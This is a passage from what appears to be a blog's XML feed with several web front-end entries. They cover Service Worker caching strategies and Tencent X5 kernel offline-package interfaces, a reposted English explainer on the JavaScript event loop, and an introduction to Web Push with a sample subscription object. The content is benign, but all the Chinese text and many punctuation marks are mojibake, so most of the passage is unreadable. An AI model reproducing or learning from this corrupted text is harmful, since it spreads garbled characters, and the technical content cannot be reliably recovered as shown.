èµ„æºåŠ è½½å¤±è´¥ã€‚è¿™é‡Œå®¹é”™æ€§æ¯”è¾ƒå·®ï¼Œé€‚åˆé¡µé¢èµ„æºéƒ½æ˜¯é™æ€èµ„æºçš„ï¼Œä¸”ä¸èƒ½ä½¿ç”¨ä¸å½±å“å®‰è£…çš„èµ„æºé¢„ç¼“å­˜ã€‚ cache-only 4.2.4 ä»…ä½¿ç”¨ç½‘ç»œ åœ¨fetchäº‹ä»¶ä¸­ï¼Œä»…å°†requesté‡æ–°æŠ½å‡ºç”¨fetchå»ç½‘ç»œåŠ è½½å¹¶è¿”å›ç»™å‰ç«¯é¡µé¢ã€‚é€‚ç”¨äºèµ„æºå¤§å¤šæ˜¯åŠ¨æ€èµ„æºã€å®æ—¶æ€§è¦æ±‚é«˜çš„åœºæ™¯ã€‚ network-only 4.2.5 ç¼“å­˜ä¼˜å…ˆ ç®€å•çš„èµ„æºç¼“å­˜ä¸­ä½¿ç”¨çš„å°±æ˜¯ç¼“å­˜ä¼˜å…ˆç­–ç•¥ï¼Œå…ˆå»ç¼“å­˜åŒ¹é…ï¼ŒåŒ¹é…å¤±è´¥æŠ˜å›ç½‘ç»œï¼Œè¿™ç®—æ˜¯æœ€å¸¸ç”¨ã€å®¹é”™æ€§èƒ½å¥½çš„ä¸€ç§ç­–ç•¥ã€‚ offline-page 4.2.6 ç½‘ç»œä¼˜å…ˆ åœ¨fetchäº‹ä»¶ä¸­å…ˆå»ç½‘ç»œfetchï¼Œå½“å‡ºç°æœåŠ¡å™¨æ•…éšœæˆ–è€…ç½‘ç»œä¸è‰¯æ—¶ï¼ŒæŠ˜å›æœ¬åœ°ç¼“å­˜ï¼Œç›®çš„æ˜¯ä¸ºäº†å±•ç¤ºæœ€æ–°çš„æ•°æ®ï¼Œå¯¹å®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜ä½†åˆèƒ½å¤Ÿå¸¦æ¥è‰¯å¥½ä½“éªŒçš„åº”ç”¨ï¼Œæ¯”å¦‚å¤©æ°”ç±»å‹åº”ç”¨ã€‚ network-first 4.2.7 é€Ÿåº¦ä¼˜å…ˆ åœ¨fetchäº‹ä»¶ä¸­åŒæ—¶å‘èµ·æœ¬åœ°ç¼“å­˜åŒ¹é…åŠç½‘ç»œè¯·æ±‚ï¼Œè°å…ˆè¿”å›ä½¿ç”¨è°çš„ï¼Œè¯¥æ–¹æ¡ˆé€‚ç”¨äºå¯¹æ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜çš„ç«™ç‚¹ï¼Œç¼©çŸ­äº†ç¼“å­˜ä¼˜å…ˆç­–ç•¥ä¸­æœ‰å¯èƒ½ç¼“å­˜ä¸­æ²¡æœ‰èµ„æºå†æŠ˜å›ç½‘ç»œçš„æ—¶é—´æ¶ˆè€—ã€‚ speed-first 4.3 Service Workerè·¨åŸŸèµ„æºçš„ç¼“å­˜ç­–ç•¥Service Workerå¯ä»¥æ‹¦æˆªå®ƒç®¡è¾–èŒƒå›´å†…çš„åŸºæœ¬æ‰€æœ‰è¯·æ±‚ï¼Œè·¨åŸŸèµ„æºä¹Ÿä¸ä¾‹å¤–ã€‚åœ¨æ™®é€šçš„é¡µé¢ä¸­ï¼ŒåŒ…å«å‡ ä¸ªè·¨åŸŸè„šæœ¬ã€å›¾ç‰‡ç­‰èµ„æºä¹Ÿå¤ªæ­£å¸¸äº†ã€‚é‚£ä¹ˆå¦‚ä½•å¯¹è¿™äº›è·¨åŸŸèµ„æºè¿›è¡Œç¼“å­˜å‘¢ï¼Ÿ é¦–å…ˆï¼Œæµè§ˆå™¨é»˜è®¤å¯¹è·¨åŸŸèµ„æºå‘èµ·çš„æ˜¯ncorsè¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯å¾—åˆ°çš„responseæ˜¯opaqueçš„ï¼ŒService Workeræ˜¯æ— æ³•è·å¾—è¯¥responseçš„statusåŠurlä¿¡æ¯ï¼Œä»¥è‡³äºè¯¥responseæ˜¯å¦æˆåŠŸä¸å¾—è€ŒçŸ¥ã€‚å¦‚æœå¯¹è·¨åŸŸèµ„æºèƒ½å¤Ÿå‘èµ·corsè¯·æ±‚ï¼Œåœ¨è·¨åŸŸæœåŠ¡å™¨å…è®¸çš„æƒ…å†µä¸‹ï¼Œå¾—åˆ°éƒ¨åˆ†å±æ€§statusåŠurlå¯è§çš„responseï¼Œå°±å¯ä»¥åˆ¤æ–­å‡ºè·¨åŸŸè¯·æ±‚æ˜¯å¦æˆåŠŸï¼Œæ˜¯å¦å¯ä»¥è¿›è¡Œç¼“å­˜ä»¥å¤‡ä¸‹æ¬¡ä½¿ç”¨äº†ã€‚æœç€è¿™ä¸ªæ€æƒ³ï¼š é¦–å…ˆä¿è¯è·¨åŸŸçš„èµ„æºæ¥è‡ªå®‰å…¨çš„httpsåœ°å€ï¼› ä¿è¯è·¨åŸŸèµ„æºæœåŠ¡å™¨çš„responseä¸­Access-Control-Allow-Originä¸­åŒ…å«å½“å‰çš„é¡µé¢æ‰€åœ¨åŸŸæˆ–è€…ä¸º *ï¼› å¯¹äºå‰ç«¯é¡µé¢ä¸­çš„è·¨åŸŸèµ„æºçš„urlå¯ä»¥é™„å¸¦â€œcors=1â€å‚æ•°ï¼Œä»¥ä¾¿Service Workeråœ¨æ‹¦æˆªä¹‹åå¯ä»¥åˆ¤æ–­å‡ºæ˜¯è·¨åŸŸè¯·æ±‚ä»è€Œé‡æ–°è¿›è¡Œç»„è£…corsè¯·æ±‚ï¼Œå¦‚å›¾17ã€‚ cross-resources 5 X5å†…æ ¸Service WorkeråŠŸèƒ½æ‰©å±•5.1 é¦–æ¬¡è®¿é—®è§£å†³æ–¹æ¡ˆæ–¹æ¡ˆé¦–æ¬¡è®¿é—®è§£å†³æ–¹æ¡ˆæ—¨åœ¨ç”¨æˆ·è®¿é—®ä¸šåŠ¡å‰å®ç°ä¸šåŠ¡çš„èµ„æºç¼“å­˜ï¼Œè®©ç”¨æˆ·åœ¨ç¬¬ä¸€æ¬¡çœŸæ­£è®¿é—®ä¸šåŠ¡æ—¶èƒ½å¤Ÿè®©ä¸šåŠ¡é¡µé¢ä»¥æœ€å¿«çš„é€Ÿåº¦å±•ç¤ºå‡ºæ¥ã€‚é’ˆå¯¹è¯¥ä¸»æ—¨ï¼ŒX5å†…æ ¸å®ç°äº†ä¸‰å¥—å…·ä½“å®ç°æ–¹æ¡ˆï¼š 5.1.1 ç¦»çº¿åŒ…æ–¹å¼ ç¦»çº¿åŒ…åŸç†å°±æ˜¯å…ˆåœ¨X5å†…æ ¸ä¸Šæ¨¡æ‹Ÿæ‰“å¼€ä¸€æ¬¡ä¸šåŠ¡ç½‘å€ï¼Œç„¶åå°†Service Workerä¸­çš„cachestorageç¼“å­˜ã€æ³¨å†Œä¿¡æ¯åŠè„šæœ¬ä¿¡æ¯æ•°æ®åº“è¿›è¡Œæ‰“åŒ…å†…ç½®åˆ°å®¿ä¸»ä¸­ï¼Œå½“å®¿ä¸»é¦–æ¬¡å®‰è£…æ—¶å°†ç¦»çº¿åŒ…è·¯å¾„å‘ŠçŸ¥å†…æ ¸ï¼Œå†…æ ¸ä¼šè‡ªåŠ¨å°†ç¦»çº¿åŒ…æ‹·è´è§£å‹åˆ°å†…æ ¸ç›®å½•ã€‚ç›¸å½“äºç”¨æˆ·è·³è¿‡äº†é¦–æ¬¡è®¿é—®å®‰è£…Service Workerçš„è¿‡ç¨‹ã€‚ä»¥QQæµè§ˆå™¨ä¸ºä¾‹ï¼š ä¸šåŠ¡ä¾§ï¼š 1ã€å‰ç«¯ä¸šåŠ¡éœ€è¦å»ºç«‹åŸºäºService Workerä¸šåŠ¡ï¼Œå¹¶ä¸”ä¸šåŠ¡å¯ä»¥é€šè¿‡SWå®ç°ç¦»çº¿è®¿é—®ï¼Œåœ¨SWè„šæœ¬çš„installæ–¹æ³•ä¸­éœ€è¦åšèµ„æºçš„ç¼“å­˜ã€‚ 2ã€å¯ä»¥é€šè¿‡QB6.8åŠä»¥ä¸Šç‰ˆæœ¬è®¿é—®swtool.qq.comï¼Œç‚¹å‡»â€œç¦»çº¿åŒ…ç”Ÿæˆç¯å¢ƒåˆå§‹åŒ–â€åé‡å¯æµè§ˆå™¨ï¼Œè¾“å…¥ä¸šåŠ¡ç½‘å€ç›´åˆ°æç¤ºç¦»çº¿åŒ…å·²ç”Ÿæˆåé€€å‡ºæµè§ˆå™¨ï¼Œè¿™æ—¶ç¦»çº¿åŒ…å·²ç”Ÿæˆåœ¨/sdcard/tbs/com.tencent.mtt/out/Service Worker.zipã€‚ 3ã€å…³é—­ç½‘ç»œè¿›å…¥QQæµè§ˆå™¨ï¼Œé€šè¿‡è®¾ç½®æ¸…é™¤ç¼“å­˜æ–‡ä»¶åå†å°†ç”Ÿæˆçš„ç¦»çº¿åŒ…æ‹·è´è‡³/sdcard/tbs/com.tencent.mtt/Service Worker.zipä½ç½®å¹¶é‡æ–°å¯åŠ¨æµè§ˆå™¨è®¿é—®ä¸šåŠ¡ç½‘å€ï¼Œå¦‚æœä¸šåŠ¡å¯ä»¥æ­£å¸¸æ‰“å¼€ï¼Œè¯´æ˜ç¦»çº¿åŒ…OKã€‚ 4ã€è‹¥ä¸šåŠ¡éœ€è¦å°†ç¦»çº¿åŒ…æ‰“è¿›å®¿ä¸»apkï¼Œåªè¦å°†ç¦»çº¿åŒ…ä¸¢ç»™å®¿ä¸»å³å¯ã€‚ X5å†…æ ¸å®¿ä¸»ä¾§ï¼š 1ã€è‹¥TBSå®¿ä¸»åªæœ‰å•ä¸ªä¸šåŠ¡ç¦»çº¿åŒ…æ‰“è¿›apkï¼Œé‚£ä¹ˆå®¿ä¸»éœ€è¦åœ¨å®¿ä¸»apké¦–æ¬¡å®‰è£…å¹¶ä¸”åœ¨TBSå†…æ ¸åˆå§‹åŒ–ä¹‹å‰å°†ä¸šåŠ¡ç¦»çº¿åŒ…æ‹·è´è‡³/sdcard/tbs/{å®¿ä¸»åŒ…å}/Service Worker.zipå³å¯ï¼ŒTBSå¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æœç´¢è¯¥è·¯å¾„ã€‚ 2ã€è‹¥TBSå®¿ä¸»æœ‰å¤šä¸ªå•ä¸šåŠ¡çš„ç¦»çº¿åŒ…éœ€è¦æ‰“è¿›apkï¼Œå¯ä»¥ç”±X5å†…æ ¸ä¾§ååŠ©å®Œæˆåˆå¹¶(åç»­ä¼šæœ‰è‡ªåŠ¨åŒ–åˆå¹¶ç«™ç‚¹å·¥å…·)ï¼Œå°†å¤šä¸ªå•ä¸šåŠ¡ç¦»çº¿åŒ…åˆå¹¶æˆä¸€ä¸ªåå†æŒ‰ç…§å•ä¸šåŠ¡çš„æ–¹å¼å¤„ç†ã€‚ 3ã€TBSå®¿ä¸»åœ¨å‘å¸ƒå‰éœ€è¦å‚è€ƒä¸šåŠ¡ä½¿ç”¨QBè‡ªæ£€çš„æ–¹å¼è‡ªæ£€ä¸šåŠ¡æ˜¯å¦å¯ä»¥ç¦»çº¿æ‰“å¼€ã€‚ 5.1.2 X5å†…æ ¸åå°äº‘ä¸‹å‘æŒ‡ä»¤ 1ã€å‰ç«¯ä¸šåŠ¡éœ€è¦å»ºç«‹åŸºäºService Workerä¸šåŠ¡ï¼Œå¹¶ä¸”ä¸šåŠ¡å¯ä»¥é€šè¿‡SWå®ç°ç¦»çº¿è®¿é—®ï¼Œåœ¨SWè„šæœ¬çš„installæ–¹æ³•ä¸­éœ€è¦åšèµ„æºçš„ç¼“å­˜ 2ã€éœ€è¦å°†æå‰é¢„ç½®çš„ä¸šåŠ¡ç½‘å€åŠService Workerè„šæœ¬urlåŠå®¿ä¸»åŒ…ååŒæ­¥ç»™X5å†…æ ¸å›¢é˜Ÿ(ç›®å‰æ¥å£è´Ÿè´£äººzhengyuliã€yongling)ï¼Œå®¡æ ¸é€šè¿‡åéšæ—¶å¯ä»¥ä¸Šçº¿ã€‚ 5.1.3 X5å†…æ ¸æ‰©å±•æ¥å£ ä½¿ç”¨TBSçš„å®¿ä¸»å¯ä»¥è°ƒç”¨X5å†…æ ¸æ‰©å±•æ¥å£webview.getX5WebViewExtension().registerServiceWorkerBackground(String url, String scriptUrl)æ¥æå‰å‘å†…æ ¸æ³¨å†ŒæŸä¸€ç‰¹å®šé¡µé¢çš„Service Workerã€‚ 5.2 ä¸¤ç§é™é»˜æ›´æ–°æ–¹æ¡ˆå¯¹äºä¸€äº›æ›´æ–°æ¯”è¾ƒé¢‘ç¹ï¼Œå®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„ä¸šåŠ¡ï¼Œå¯¹æ›´æ–°èƒ½åŠ›éœ€æ±‚ä¹Ÿæ˜¯ç›¸å½“äºŸéœ€ã€‚ä¸€æ–¹é¢èƒ½è®©ç”¨æˆ·èƒ½å¤ŸåŠæ—¶çœ‹åˆ°æœ€æ–°æ¶ˆæ¯ï¼ˆService Workerç›®å‰è‡ªå¸¦çš„æ›´æ–°èƒ½åŠ›åªä¼šå‘ç”Ÿåœ¨å½“å‰è®¿é—®åï¼Œåªæœ‰ä¸‹æ¬¡æ‰èƒ½çœ‹åˆ°æ–°æ›´æ–°çš„é¡µé¢ï¼‰ï¼Œå¦ä¸€æ–¹é¢èƒ½å¤Ÿç¼“è§£å¯¹ä¸šåŠ¡æœåŠ¡å™¨çš„å¹¶å‘è®¿é—®ï¼Œè¿˜èƒ½å¤Ÿç¼“è§£ç”¨æˆ·çš„ç½‘ç»œæ…¢å¯¼è‡´è¿›è¡Œä¸šåŠ¡æ›´æ–°æ—¶é•¿æ—¶é—´ç­‰å¾…ã€‚å…·ä½“å®ç°æ¡†æ¶è§å›¾17ã€‚ 5.2.1 TBSåå°äº‘ä¸‹å‘æŒ‡ä»¤ 1ã€å‰ç«¯ä¸šåŠ¡éœ€è¦éªŒè¯ä¸šåŠ¡åœ¨æ›´æ–°Service Workerè„šæœ¬åæ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—® 2ã€éœ€è¦å°†æå‰é¢„ç½®çš„ä¸šåŠ¡ç½‘å€åŠService Workerè„šæœ¬urlåŠå®¿ä¸»åŒ…åå’Œæ›´æ–°æ—¶é—´é—´éš”åŒæ­¥ç»™X5å†…æ ¸å›¢é˜Ÿ(ç›®å‰æ¥å£è´Ÿè´£äººzhengyuliã€yongling)ï¼Œå®¡æ ¸é€šè¿‡åéšæ—¶å¯ä»¥ä¸Šçº¿ã€‚ 5.2.2 TBS webviewæ‰©å±•æ¥å£ ä½¿ç”¨TBSçš„å®¿ä¸»å¯ä»¥è°ƒç”¨X5å†…æ ¸æ‰©å±•æ¥å£webview.getX5WebViewExtension().updateServiceWorkerBackground(String url)æ¥æå‰å‘å†…æ ¸ç”³è¯·æ›´æ–°ç‰¹å®šä¸šåŠ¡çš„Service Worker(æ³¨æ„è¿™é‡Œéœ€è¦ä¸šåŠ¡å·²ç»åœ¨å†…æ ¸ä¸­å®‰è£…è¿‡Service Workerï¼Œåˆ‡æ­¤æ¥å£è°ƒç”¨ä¸€æ¬¡åªä¼šå¼ºåˆ¶æ›´æ–°ä¸€æ¬¡)ã€‚ 6 X5å†…æ ¸åŸºäºService Workerç¦»çº¿åœºæ™¯åŠ è½½ä¼˜åŒ–é€šå¸¸appåœ¨ä½¿ç”¨webviewæ—¶ï¼Œä¸ºäº†æå‡å±•ç¤ºé¡µé¢çš„é€Ÿåº¦ï¼Œä¸€èˆ¬éƒ½ä¼šä½¿ç”¨webviewçš„shouldInterceptRequestæ¥æ‹¦æˆªwebviewçš„èµ„æºè¯·æ±‚ï¼Œç„¶åå°†æœ¬åœ°çš„èµ„æºæ ¡éªŒåä¸¢ç»™webviewå¤„ç†ã€‚å› ä¸ºshouldInterceptRequestä»å†…æ ¸é€šçŸ¥åˆ°appï¼Œéœ€è¦ç»Ÿä¸€åœ¨Fileçº¿ç¨‹ä¸­æ’é˜Ÿå¹¶ç»å†å¥½å‡ ä¸ªçº¿ç¨‹çš„ä¸­è½¬åˆ°è¾¾appï¼Œå¯¹äºèµ„æºå¹¶å‘è¯·æ±‚è¾ƒå°‘çš„é¡µé¢æ¥è¯´ï¼Œè¿™ç§ç“¶é¢ˆå¯èƒ½å¹¶ä¸æ˜æ˜¾ï¼Œå¯¹äºé¡µé¢è¾ƒå¤æ‚å¹¶å‘è¯·æ±‚è¾ƒå¤šçš„é¡µé¢æ¥è¯´ï¼Œé¦–å±åŠ è½½å®Œæˆçš„æ—¶é—´å¹¶ä¸èƒ½åƒæ‰“å¼€æœ¬åœ°é¡µé¢é‚£æ ·â€œç§’å¼€â€ã€‚ X5å†…æ ¸å€Ÿé‰´Service WorkeråŸç†ï¼Œå…è®¸appæå‰å°†ä¸šåŠ¡çš„èµ„æºæ”¾å…¥åˆ°å†…æ ¸ç¼“å­˜ï¼Œå½“ä¸šåŠ¡è¢«è®¿é—®æ—¶ï¼Œä¼šå…ˆè®¿é—®æœ¬åœ°cacheï¼Œæœ‰å°±ç›´æ¥è¿”å›ç»™å†…æ ¸ï¼Œæ²¡æœ‰å°±è·³è¿‡shouldInterceptRequestç›´æ¥å»ç½‘ç»œåŠ è½½ï¼Œæ¥å±è”½shouldInterceptRequestæ€§èƒ½ç“¶é¢ˆã€‚åœ¨æ‰‹æœºQQä¸Šçš„ä¸ªåˆ«ä¸šåŠ¡ä¸Šæœ‰é¦–å±æ€§èƒ½æœ‰25%å·¦å³çš„æå‡ã€‚ ä½¿ç”¨TBSçš„å®¿ä¸»åœ¨ç©ºé—²æ—¶é—´ï¼ˆä¸è¦åœ¨æ‰“å¼€ä¸šåŠ¡çš„æ—¶å€™ï¼Œè½¬å…¥å†…æ ¸ç¼“å­˜éœ€è¦æ¶ˆè€—èµ„æºï¼‰å¯ä»¥è°ƒç”¨X5å†…æ ¸æ‰©å±•æ¥å£ webview.getX5WebViewExtension().registerServiceWorkerOffline(String url, List paths, boolean deleteAllCacheBefore) å…¶ä¸­urlä¸ºä¸šåŠ¡ç½‘å€ï¼Œpathsä¸ºç»å¯¹ç¼“å­˜è·¯å¾„ï¼Œå¦‚ https://host.com/path1/path2/img.png éœ€è¦å»ºç«‹//cache/host.com/path1/path2/img.png è¿™æ ·çš„è·¯å¾„ï¼Œå¹¶å°†//cacheä¼ å…¥å†…æ ¸ï¼Œå› ä¸ºæ˜¯listï¼Œæ‰€ä»¥æ”¯æŒå¤šä¸ªç›®å½•ï¼Œæ¯”å¦‚//cache1ã€//cache2ç­‰ã€‚deleteAllCacheBefore åˆ é™¤è¯¥ä¸šåŠ¡ä¹‹å‰ä¹Ÿæœ‰ç¼“å­˜ï¼Œå› ä¸ºåœ¨æ›´æ–°èµ„æºæ—¶ä¹Ÿæ˜¯è°ƒç”¨åŒæ ·çš„æ¥å£ï¼Œæ‰€ä»¥å¯èƒ½ä¼šå‡ºç°å†…æ ¸ç¼“å­˜çš„å†—ä½™ã€‚ å¦å¤–å¯ä»¥è°ƒç”¨webview.getX5WebViewExtension().clearServiceWorkerCache()[å°†ä¼šåœ¨TBS3.3ä¸Šæä¾›]æ¥æ¸…é™¤è½¬å…¥å†…æ ¸çš„ç¼“å­˜ï¼ŒåŒ…æ‹¬æ³¨å†Œä¿¡æ¯ï¼Œä»¥ä¾¿èƒ½å¤ŸåŠ¨æ€çš„æ¢å¤åˆ°ä¹‹å‰çš„çŠ¶æ€ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Understanding JavaScript â€” Heap, Stack, Event-loops and Callback Queue]]></title>
    <url>%2F2019%2F11%2F24%2FWeb%E5%89%8D%E7%AB%AF%2FUnderstanding%20JavaScript%20%E2%80%94%20Heap%2C%20Stack%2C%20Event-loops%20and%20Callback%20Queue%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ª https://medium.com/ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://medium.com/javascript-in-plain-english/understanding-javascript-heap-stack-event-loops-and-callback-queue-6fdec3cfe32e JavaScript is a single thread language which makes it different from most of the languages. It is lack of multi-thread applicationâ€™s abilities whereas it does not have to deal with complex problems such as deadlock or shared variable problems. Single thread?A single thread language will be lack of having concurrent processes running at the same time. That means, if you have a process which takes long time, then it will block other processes to run. For that reason, there is a timeout defined in browsers which waits for response of process. When the process does not response in that timeout, you will see a popup which asks you to kill process or not. Do not run any business that will take long time on browser for not to block other functions. So, How JavaScript simulate like itâ€™s running our commands in a multi-thread environment? To answer this question letâ€™s deep into how JavaScript environment. JavaScript environment Although JavaScript is a single thread language, we have a strong helper which is browser that has ability to manage complex operations. Web API, Callback Queue and Event Loop mechanisms are part of browsers. Letâ€™s dig into some details of each part. HeapHeap is the place (memory) where objects are stored when we define variables. StackStacks holds our function calls. On each new function call, itâ€™s pushed on top of the stack. You can see your stack when you have an exception on JavaScript by stack trace. Web APIBrowsers have defined APIâ€™s which developers can be used to make complex processes such as to get location of visitor, GeoLocation is defined. A list of APIs are defined in the link which you can find in references (1). Callback QueueWhen a process finished its job, such as a xhr call, itâ€™s dropped in a callback queue. Callback queue is triggered by event loop process after our stack is empty which means the process waits in that queue until our stack is empty. Once our stack has no function call, then a process is popped-out from callback queue and pushed in to stack. Event Loop A process which is responsible to check our stack and then trigger our callback queue continuously. Example Whatâ€™s the expected output of above example? It starts with a console.log then continue with a setTimeout function which we wanted to run immediately(?) by giving a â€œ0â€ timeout then another console.log. setTimeout is something special. Itâ€™s not defined in ECMAScript specification. It is a Web API (2). It works asynchronously. The given timeout does not guarantee that function will work after the given time but guarantees that it will wait at least given time. So setTimeout(fn,0) will not start immediately but it will wait at least zero millisecond. Letâ€™s explain how it will behave when we run above code snippet. our first console.log(â€œMuratâ€) will be pushed to stack because we are making a function call. The variable will be saved in heap (memory) Because itâ€™s not a async call, itâ€™ll output given parameter First console.log function will be removed from stack, and heap will be empty setTimeout function will be called. So itâ€™ll be pushed to stack Itâ€™s a async function and is a Web API function. Itâ€™ll be pushed to Web API box and setTimeout function will be removed from stack A timer in the background will be started to wait at least given amount of time to setTimeout. console.log(â€œYusufâ€) will be called and itâ€™ll be pushed to stack and Yusuf will be stored in heap. It will output Yusuf. But at the same time, our event loop will continue checking stackâ€™s status. After output of Yusuf, itâ€™ll be removed from stack and heap. When the timer be sured that itâ€™s waited at least given time, itâ€™ll be pushed to callback queue (console.log(â€œFatihâ€)) Our event loop will trigger callback queue when the stack gets empty. Next, console.log(â€œFatihâ€) will be put to stack So, our output will be in the order of â€œMuratâ€, â€œYusufâ€, â€œFatihâ€ References Web API list, https://developer.mozilla.org/en-US/docs/Web/API setTimeout specification, https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web Push]]></title>
    <url>%2F2019%2F11%2F19%2FWeb%E5%89%8D%E7%AB%AF%2FWeb%20Push%2F</url>
    <content type="text"><![CDATA[ä»€ä¹ˆæ˜¯ Web Pushç›®å‰å¤§éƒ¨åˆ†æµè§ˆå™¨å·²ç»æ”¯æŒ Notification APIï¼Œä½† Web Notification è¦æ±‚ç”¨æˆ·å¿…é¡»åœ¨çº¿æ‰“å¼€ Web Pageã€‚é‚£ä¹ˆå¦‚ä½•åœ¨ç½‘é¡µå…³é—­æƒ…å†µä¸‹ç»§ç»­å‘é€ Web Notification å‘¢ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯æˆ‘ä»¬ä»Šå¤©è¦ä»‹ç»çš„åŸºäº Service Worker å’Œ Push API çš„ Web Push æŠ€æœ¯ã€‚ å®ç°ç»†èŠ‚ ç”¨æˆ·æˆæƒï¼šå‘ç”¨æˆ·è¯·æ±‚ç”¨äºæ¥æ”¶æ¶ˆæ¯æ¨é€çš„æƒé™ã€‚ æ³¨å†Œ Service Workerï¼šé¡µé¢å‘æµè§ˆå™¨æ³¨å†Œä¸€ä¸ªServiceWorkerï¼Œæµè§ˆå™¨ç”Ÿæˆå¯¹åº” ServiceWorkerRegistrationå¯¹è±¡ã€‚ è®¢é˜…æ¶ˆæ¯ï¼šé¡µé¢é€šè¿‡ ServiceWorker çš„ PushManager.subscribe æ–¹æ³•å‘ push serviceï¼ˆFCMï¼‰è®¢é˜…æ¶ˆæ¯ï¼ŒFCM è¿”å› push subscription ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ‰¾åˆ°å¯¹åº”çš„ ServiceWorkerï¼Œå¹¶æŠŠ push subscription å›ä¼ ç»™ServiceWorkerã€‚ åœ¨è®¢é˜…ä¸€ä¸ªç”¨æˆ·ä¹‹å‰ï¼Œéœ€è¦é‡‡ç”¨ VAPID åè®®ç”Ÿæˆä¸€å¥—åº”ç”¨æœåŠ¡å™¨å¯†é’¥ï¼Œä¹Ÿè¢«ç§°ä¸º VAPID å¯†é’¥ï¼Œå¯¹äºæ¯ä¸ªè¯·æ±‚ Push Service çš„ Web åº”ç”¨æœåŠ¡å™¨æ¥è¯´æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼ŒPush Service æ ¹æ® VAPID æ¥å®šä½å“ªä¸ª Web åº”ç”¨æœåŠ¡å™¨è§¦å‘äº†æ¨é€æ¶ˆæ¯ç»™å“ªä¸ªç”¨æˆ·ã€‚ ä¸ŠæŠ¥ push subscription ï¼šé¡µé¢è·å–åˆ° push subscription é€šè¿‡ Ajax å°†å®ƒå‘é€ç»™ Web åº”ç”¨æœåŠ¡å™¨ã€‚ 12345678&#123; &quot;endpoint&quot;: &quot;https://random-push-service.com/some-kind-of-unique-id-1234/v2/&quot;, &quot;keys&quot;: &#123; &quot;p256dh&quot; :&quot;BNcRdreALRFXTkOOUHK1EtK2wtaz5Ry4YfYCA_0QTpQtUbVlUls0VJXg7A8u-Ts1XbjhazAkj7I99e8QcYP7DkM=&quot;, &quot;auth&quot; : &quot;tBHItJI5svbpez7KI4CCXg==&quot; &#125;&#125; æ¨é€æ¶ˆæ¯ï¼šWeb åº”ç”¨æœåŠ¡å™¨éœ€è¦æ¨é€æ¶ˆæ¯æ—¶ï¼Œå°† push message å’Œ push subscription å‘é€ç»™ push serviceï¼ˆFCMï¼‰ã€‚ é€šçŸ¥ï¼šFCM æ ¹æ® push subscription æ‰¾åˆ°å¯¹åº”çš„æµè§ˆå™¨å®¢æˆ·ç«¯å¹¶æŠŠæ¶ˆæ¯æ¨é€ç»™å®ƒï¼Œæµè§ˆå™¨å”¤é†’ç›¸åº”çš„ ServiceWorker å¹¶è§¦å‘ push äº‹ä»¶ï¼Œé€šçŸ¥ç”¨æˆ·ã€‚ å–æ¶ˆè®¢é˜…ï¼šé¡µé¢åœ¨ä¸å†éœ€è¦è®¢é˜…æ¶ˆæ¯æ—¶ï¼Œå¯ä»¥å‘é€ Ajax è¯·æ±‚é€šçŸ¥ Web åº”ç”¨æœåŠ¡å™¨å»æ¸…é™¤ push subscription å¹¶è°ƒç”¨ PushSubscription.unsubscribe å‘ push service å»å–æ¶ˆè®¢é˜…ã€‚ ä½“éªŒä¸€æŠŠæˆ‘ä»¬ä» https://github.com/uestc66/web-push-codelab ä¸Š clone ä»£ç ï¼ŒæŒ‰æ–‡æ¡£æŒ‡ç¤ºæ­¥éª¤æ“ä½œæ¨¡æ‹Ÿä¸€ä¸ª Web Push çš„åŸºæœ¬æµç¨‹ï¼š å®ç°é—¨æ§› Service Workerï¼šä¸ºäº†åšåˆ°åœ¨ç½‘é¡µå…³é—­çš„æƒ…å†µä¸‹ï¼Œè¿˜èƒ½ç»§ç»­å‘é€ Notificationï¼Œå¿…é¡»ä½¿ç”¨é©»ç•™è¿›ç¨‹ï¼Œè€Œç°åœ¨ Web é©»ç•™è¿›ç¨‹å°±æ˜¯ç°åœ¨æ­£åœ¨å¤§åŠ›æ™®åŠçš„ Service Workerï¼ˆchrome ä¸‹æ‰“å¼€ï¼š chrome://serviceworker-internals æŸ¥çœ‹ï¼‰ã€‚ æµè§ˆå™¨å¿…é¡»æ”¯æŒ Push API åŠ Notification APIã€‚ç›®å‰å¤§éƒ¨åˆ†ç”¨æˆ·æµè§ˆå™¨æ˜¯åŸºäº Chrome å†…æ ¸ï¼Œ API æ”¯æŒåº¦è¿˜ç®—å¯ä»¥ã€‚ HTTPSï¼šå‡ºäºå®‰å…¨æ–¹é¢çš„è€ƒè™‘ï¼ŒService Worker åªèƒ½è·‘åœ¨ HTTPS é¡µé¢ã€‚ç›®å‰å¤§éƒ¨åˆ†ç½‘ç«™å·²ç»æ˜¯ HTTPS çš„äº†ï¼Œè¿™ä¸ªé—®é¢˜ä¸å¤§ã€‚ æµè§ˆå™¨å®¢æˆ·ç«¯å’Œ Web åº”ç”¨æœåŠ¡å™¨éƒ½å¿…é¡»èƒ½å¤Ÿè®¿é—® Google Serviceã€‚Push Service çš„é»˜è®¤å®ç°æ˜¯ Google çš„ FCM/GCM ï¼ˆæŸ¥çœ‹ chrome://gcm-internals/ï¼‰ï¼Œè€Œç›®å‰å¤§éƒ¨åˆ†å›½å†…ç½‘ç»œç¯å¢ƒæ— æ³•è®¿é—® Chrome çš„ FCM æ¨é€æœåŠ¡ï¼Œæ‰€ä»¥åœ¨ä¸ç¿»å¢™çš„ç½‘ç»œç¯å¢ƒä¸‹æµè§ˆå™¨æ— æ³•å®Œæˆæ¶ˆæ¯è®¢é˜…å’Œæ¨é€ã€‚ æµè§ˆå™¨è‡ªå»º push service 